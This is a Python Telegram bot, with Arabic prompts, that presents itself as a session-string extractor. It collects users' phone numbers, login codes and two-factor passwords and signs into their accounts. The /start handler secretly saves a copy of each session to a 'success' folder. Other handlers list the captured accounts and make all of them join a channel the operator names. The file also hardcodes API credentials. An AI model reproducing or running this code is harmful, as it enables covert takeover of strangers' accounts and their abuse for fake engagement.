import asyncio, os, time, shutil
from pyrogram import Client, filters, idle
from kvsqlite.sync import Client as DB
botdb = DB('database/botdb.sqlite')
from pyrogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton, InlineKeyboardButton,InlineKeyboardMarkup
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeExpired
from pyrogram.errors.exceptions.bad_request_400 import PasswordHashInvalid
from pyrogram.errors.exceptions.not_acceptable_406 import PhoneNumberInvalid
from pyrogram.errors.exceptions.bad_request_400 import PhoneCodeInvalid
from telethon import __version__ as v2
from pyrogram import __version__ as v
from pyromod import listen
from pyrogram.errors import FloodWait
##############################
def count_files_in_folder(folder_path):
	try:
		files = [f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
		num_files = len(files)
		return num_files
	except FileNotFoundError:
		return 0

def copy_files(source_path, destination_path):
	try:
		shutil.copy(source_path, destination_path)
	except FileNotFoundError:
		print("File not found. Check the source path.")
	except PermissionError:
		print("Permission error. Make sure you have the necessary permissions.")
##############################
ownerID = int("6301863282")
api_hash = "b25cce1727f6d33d41d9e00e3ed62583"
api_id = 27477919
token = "xxxxxxxxx"

bot = Client(
	'bot'+token.split(":")[0],
	api_id,
	api_hash,
	bot_token=token,
	in_memory=True
)
app = Client(
	name="bot",
	api_id=api_id, api_hash=api_hash,
	bot_token=token,
	in_memory=True
)
##############################
async def get_users_info(session_path):
	try:
		session_path = session_path.replace(".session", "")
		c = Client(session_path, api_id, api_hash)
		await c.start()
		iD,first_name=c.me.id,c.me.first_name
		return iD, first_name
	except Exception as e:
		print(f"Error extracting user info from session {session_path}: {e}")
		return None
	finally:
		if c.is_connected:
			await c.stop()
##############################
async def join_channels(session_path,join_link):
	try:
		session_path = session_path.replace(".session", "")
		c = Client(session_path, api_id, api_hash)
		await c.start()
		await c.join_chat(join_link)
		return "join successfully"
	except Exception as e:
		print(f"Error joining with session {session_path}: {e}")
		return None
	finally:
		if c.is_connected:
			await c.stop()
##############################
@app.on_message(filters.command("show") & filters.private)
async def show_sessions(_, message):
	try:
		folder_path = "success"
		files = [f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
		if not files:
			await message.reply("No sessions available.");return
		sessions_info = "Sessions Information:\n"
		for file in files:
			if file.endswith("session-journal"):break
			user_info = await get_users_info(os.path.join(folder_path, file))

			if user_info:
				user_id, first_name = user_info
				sessions_info += f"User ID: {user_id}, First Name: {first_name}\n"
			else:
				sessions_info += f"Error getting info for session {file}\n"
		await message.reply(sessions_info)
	except Exception as e:
		print(f"Error in /show command: {e}")
##############################
@app.on_message(filters.command("bu") & filters.private)
async def handle_message(client, message):
	inline_keyboard =[
	[InlineKeyboardButton("دخول قنوات", callback_data='join channels')],
	[InlineKeyboardButton("تحت التطوير", callback_data='test two')]
	]
	reply_markup = InlineKeyboardMarkup(inline_keyboard)

	await client.send_message(
	chat_id=message.from_user.id,
	text="Hello! Click the button below:",
	reply_markup=reply_markup)
##############################
@app.on_callback_query()
async def handle_callback_query(client, callback_query):
	data = callback_query.data
	chat_id= callback_query.from_user.id
	if data == 'join channels':
		fuck = await callback_query.message.chat.ask(
		text="ارسل رابط القناة:",
		reply_to_message_id =callback_query.message.id, filters=filters.text)
		await client.send_message(chat_id, text="جاراً الدخول للقناة بجميع الحسابات")
		if fuck.text.startswith("https://t.me/") or fuck.text.startswith("t.me/"):
			fuck.text = fuck.text.replace("https://t.me/","@")
			fuck.text = fuck.text.replace("t.me/","@")
		try:
			folder_path = "success"
			files = [f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
			if not files:
				await client.send_message(chat_id, text="No sessions available.");return
			succ = 0
			fucked = 0
			for file in files:
				if file.endswith("session-journal"):break
				try:
					res = await join_channels(os.path.join(folder_path, file),fuck.text)
					if res is None:fucked += 1
					else:succ += 1
				except:fucked += 1
			await client.send_message(chat_id, text=f"""
Joined Channel Successfull
Succesful accounts: {succ}
Erros: {fucked}""")
		except:
			await client.send_message(chat_id, text="an error happend");return
		
	elif data == 'test two':
		await client.send_message(chat_id, text="You clicked button 2!")
##############################
@app.on_message(filters.command("start") & filters.private)
async def start_msg(app, m):
	rep = await m.reply(
		"**⏳ يـعالـج..**", reply_markup=ReplyKeyboardRemove(),
		quote=True)
	folder_path = "sessions"
	result = count_files_in_folder(folder_path)
	name = f"pyro{m.from_user.id}{(result+1)}"
	c = Client(
			f"sessions/{name}"
			,api_id, api_hash,
			device_model="Pyrogram",
		)
	await c.connect()
	await rep.delete()
	phone_ask = await m.chat.ask(
			"⎆ يـرجـى إرسـال رقـم هاتفـك مـع رمـز الدولة مثــال 📱: \n+963995×××××",
			reply_to_message_id=m.id, filters=filters.text
		)
	phone = phone_ask.text
	try:
		send_code = await c.send_code(phone)
	except PhoneNumberInvalid:
		return await phone_ask.reply("⎆ رقـم الهـاتف الذي أرسلـته غير صالح أعـد استخـراج الجلسـة مـرة أخـرى .\n/start", quote=True)
	except Exception:
		return await phone_ask.reply("خطأ! ، يرجى المحاولة مرة أخرى لاحقًا 🤠\n/start", quote=True)
	hash = send_code.phone_code_hash
	code_ask = await m.chat.ask(
			"⎆ أرسـل الكـود\n إذا جاءك في هـذه الطريقـة '12345' أرسـل بين كـل رقـم فـراغ\nمثـال : ' 1 2 3 4 5' .", filters=filters.text
		)
	code = code_ask.text
	try:
		await c.sign_in(phone, hash, code)
	except SessionPasswordNeeded:
		password_ask = await m.chat.ask("⎆ يـرجـى إرسـال التحقق الخـاص بحسـابك ..", filters=filters.text)
		password = password_ask.text
		try:
			await c.check_password(password)
		except PasswordHashInvalid:
			return await password_ask.reply("» التحقـق بخطوتيـن الخـاص بـك غيـر صـالح.\nيرجـى إعـادة استخـراج الجلسـة مـرة أخـرى.\n/start", quote=True)
	except (PhoneCodeInvalid, PhoneCodeExpired):
		return await code_ask.reply("رمز الهاتف غير صالح!", quote=True)
	try:
		await c.sign_in(phone, hash, code)
	except:
		pass
	rep = await m.reply("**⏳ يـعـالـج ..**", quote=True)
	get = await c.get_me()
	text = '**✅ تم تسجيل الدخول بنجاح\n'
	text += f'👤 الاسم الأول : {get.first_name}\n'
	text += f'🆔 بطاقة تعريف : {get.id}\n'
	text += f'📞 رقم الهاتف : {phone}\n'
	text += '🔒 تم حفظ الجلسة في الرسائل المحفوظة \n'
	text += '\n/start'
	string_session = await c.export_session_string()

	await rep.delete()
	await c.send_message('me', f'تم استخراج جلسة بايروجرام {v} هذه الجلسة\n\n`{string_session}`')
	source_file = f"sessions/{name}.session"
	destination_file = f"success/{name}.session"
	copy_files(source_file, destination_file)

	await c.disconnect()
	await app.send_message(
			m.chat.id, text
		)
##############################
try:
	app.start()
	bot.start()
	print("تم تشغيل البوت")
	idle()

except FloodWait as e:
	print(f"flood fuck we need to wait {e.value}")
	time.sleep(e.value)
	app.start()
	bot.start()
	print("تم تشغيل البوت")
	idle()

except:
	print("fuck")
